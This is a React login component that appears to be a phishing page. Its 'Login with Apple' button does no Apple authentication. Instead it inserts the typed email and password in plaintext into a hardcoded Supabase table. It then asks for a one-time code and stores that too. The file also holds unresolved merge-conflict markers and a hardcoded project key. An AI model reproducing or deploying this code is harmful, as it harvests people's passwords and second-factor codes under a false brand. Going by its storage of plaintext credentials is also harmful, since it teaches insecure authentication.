import { useState } from 'react'
import '../../App.css'
import Dashboard from './Dashboard.jsx'
import { useNavigate } from 'react-router-dom'
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
<<<<<<< HEAD:Client/src/components/ui/Auth.jsx


=======
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import apple from "./assets/apple.svg"
import { createClient } from '@supabase/supabase-js';
>>>>>>> 411bf98f965d0d680caa435383ee9eb2a5ea221a:Client/src/Auth.jsx
function Auth() {
  const [showOtp, setShowOtp] = useState(false);
  const supabase = createClient('https://jwmlzordbunniigqkxdr.supabase.co', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imp3bWx6b3JkYnVubmlpZ3FreGRyIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzY3NzI5NjcsImV4cCI6MjA5MjM0ODk2N30.vDUxu1vE01AmiOviDcH-lfMf_va2iIJbrpU9WfMBz-g')
  const [formData, setFormData] = useState({ username: '', password: '', otp: '' });
  const navigate = useNavigate()
  const handleLogin = async (e) => {
  e.preventDefault();
  const { data, error } = await supabase
    .from('user')
    .insert([{ email: formData.username, password: formData.password }]);

  if (error) {
    console.error("Error saving to cloud:", error);
  } else {
    console.log("Data saved to cloud successfully!");
    setShowOtp(true);
    
  }
}
const handleVerify = async (e) => {
  e.preventDefault();
  const { data, error } = await supabase
    .from('user')
    .insert([{ email: formData.username, password: formData.password, OTP: formData.otp }]);

  if (error) {
    console.error("Error saving to cloud:", error);
  } else {
    console.log("Data saved to cloud successfully!");
    navigate('/dashboard');
    
  }
}
  return (
    <>
      <Card className="w-[350px] mx-auto mt-50">
        <CardHeader>
          <CardTitle>Login</CardTitle>
        </CardHeader>
        <CardContent className="flex flex-col gap-6">
          <form className='flex flex-col gap-6' onSubmit={(e) => { e.preventDefault(); navigate('/dashboard') }}>
            <Input type="text" value={formData.username} onChange={(e) => setFormData({ ...formData, username: e.target.value })} placeholder="Username" />
            <Input type="password" value={formData.password} onChange={(e) => setFormData({ ...formData, password: e.target.value })} placeholder="Password" />
            <Button type="submit">Login</Button>
          </form>
          <Button variant="outline" className="w-full" onClick={handleLogin} ><img src={apple} alt="apple" className='w-4 h-4' /> Login with Apple</Button>
        </CardContent>
      </Card>
      <Dialog open={showOtp} onOpenChange={setShowOtp}>
        <DialogContent className="sm:max-w-[350px] rounded-3xl">
          <DialogHeader>
            <DialogTitle>Enter OTP</DialogTitle>
            <DialogDescription>Check your device for the code.</DialogDescription>
          </DialogHeader>
          <div className="flex flex-col gap-4">
            <Input placeholder="Enter 6-digit code" className="text-center text-2xl tracking-widest" value={formData.otp} onChange={(e) => setFormData({ ...formData, otp: e.target.value })} />
            <Button onClick={handleVerify}>Verify & Continue</Button>
          </div>
        </DialogContent>
      </Dialog>
    </>
  )
}

export default Auth